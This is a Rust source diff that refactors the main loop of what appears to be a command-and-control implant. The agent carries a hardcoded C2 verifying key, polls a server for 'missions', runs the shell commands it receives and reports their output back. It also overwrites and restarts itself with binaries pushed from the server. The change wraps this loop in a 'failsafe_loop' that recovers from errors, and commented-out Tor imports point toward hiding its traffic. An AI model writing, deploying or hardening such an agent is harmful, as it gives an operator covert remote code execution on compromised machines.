@@ -4,7 +4,7 @@ use std::{env, fs, thread, time};
 // use arti_client::{TorClient, TorClientConfig};
 // use arti_hyper::ArtiHttpConnector;
 use base64::{prelude::BASE64_STANDARD, Engine as _};
-use common::{api, crypto};
+use common::{crypto, model};
 use log::{error, info};
 // use futures::{Stream, StreamExt};
 // use hyper::Body;
@@ -76,15 +76,58 @@ use log::{error, info};
 
 mod client;
 mod error;
-#[cfg(unix)]
-mod linux;
-#[cfg(windows)]
-mod windows;
+mod platform;
 
 type AgentResult<T> = Result<T, error::AgentError>;
 
-const IDENTITY: &str = "1nlpuul3mNmk9oJ27Usp5Ekfm+MM1CMYBX8FiLTwqd8=";
 const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";
+
+fn failsafe_loop(
+    signing_key: &mut crypto::SigningKey,
+    c2_verifying_key: &crypto::VerifyingKey,
+    agent_path: &std::path::Path,
+) -> AgentResult<()> {
+    loop {
+        match client::missions::get_next(signing_key, &c2_verifying_key) {
+            Ok(mission) => {
+                if let Some(mission) = mission {
+                    match &mission.task {
+                        model::Task::Update(data) => {
+                            info!("Updating agent '{}'", agent_path.display());
+                            let new_agent_path = agent_path.with_file_name("agent.new");
+                            fs::write(&new_agent_path, data)?;
+                            self_replace::self_replace(&new_agent_path)?;
+                            fs::remove_file(&new_agent_path)?;
+                            platform::execute_detached(&agent_path, mission)
+                                .expect("Failed to restart the agent");
+                            break;
+                        }
+                        model::Task::Execute(command) => {
+                            info!("Executing command: {command}");
+                            let output = match platform::execute_cmd(command) {
+                                Ok(output) => output.stdout,
+                                Err(e) => e.to_string().as_bytes().to_vec(),
+                            };
+                            client::missions::report(
+                                signing_key,
+                                mission,
+                                &String::from_utf8(output).unwrap(),
+                            )?;
+                        }
+                        model::Task::Stop => {
+                            client::missions::report(signing_key, mission, "OK")?;
+                            break;
+                        }
+                    }
+                }
+            }
+            Err(e) => error!("Error: {e}"),
+        }
+        thread::sleep(time::Duration::from_secs(5));
+        // thread::sleep(time::Duration::from_millis(500));
+    }
+    Ok(())
+}
 
 fn main() -> AgentResult<()> {
     if env::var("RUST_LOG").is_err() {
@@ -100,13 +143,7 @@ fn main() -> AgentResult<()> {
     info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
     let agent_path = env::current_exe()?;
 
-    let mut signing_key = crypto::get_signing_key_from(
-        BASE64_STANDARD
-            .decode(IDENTITY)?
-            .as_slice()
-            .try_into()
-            .unwrap(),
-    );
+    let mut signing_key = platform::signing_key()?;
     let c2_verifying_key = crypto::VerifyingKey::from_bytes(
         BASE64_STANDARD
             .decode(C2_VERIFYING_KEY)?
@@ -117,57 +154,14 @@ fn main() -> AgentResult<()> {
     .unwrap();
 
     if let Some(mission) = std::env::args().skip(1).next() {
-        let mission: api::Mission = serde_json::from_str(&mission)?;
+        let mission: model::Mission = serde_json::from_str(&mission)?;
         info!("Agent restarted by mission [{}]", mission.id);
         client::missions::report(&mut signing_key, mission, "OK")?;
     }
 
-    loop {
-        match client::missions::get_next(&mut signing_key, &c2_verifying_key) {
-            Ok(mission) => {
-                if let Some(mission) = mission {
-                    match &mission.task {
-                        api::Task::Update(data) => {
-                            info!("Updating agent '{}'", agent_path.display());
-                            let new_agent_path = agent_path.with_file_name("agent.new");
-                            fs::write(&new_agent_path, data)?;
-                            self_replace::self_replace(&new_agent_path)?;
-                            fs::remove_file(&new_agent_path)?;
-                            #[cfg(unix)]
-                            linux::execute_detached(&agent_path, mission)
-                                .expect("Failed to restart the agent");
-                            #[cfg(windows)]
-                            windows::execute_detached(&agent_path, mission)
-                                .expect("Failed to restart the agent");
-                            break;
-                        }
-                        api::Task::Execute(command) => {
-                            info!("Executing command: {command}");
-                            #[cfg(unix)]
-                            let output = linux::execute_cmd(command);
-                            #[cfg(windows)]
-                            let output = windows::execute_cmd(command);
-                            let output = match output {
-                                Ok(output) => output.stdout,
-                                Err(e) => e.to_string().as_bytes().to_vec(),
-                            };
-                            client::missions::report(
-                                &mut signing_key,
-                                mission,
-                                &String::from_utf8(output).unwrap(),
-                            )?;
-                        }
-                        api::Task::Stop => {
-                            client::missions::report(&mut signing_key, mission, "OK")?;
-                            break;
-                        }
-                    }
-                }
-            }
-            Err(e) => error!("Error: {e}"),
-        }
+    while let Err(e) = failsafe_loop(&mut signing_key, &c2_verifying_key, &agent_path) {
+        error!("Error: {e}");
         thread::sleep(time::Duration::from_secs(5));
-        // thread::sleep(time::Duration::from_millis(500));
     }
     info!("Stopping agent");
     Ok(())
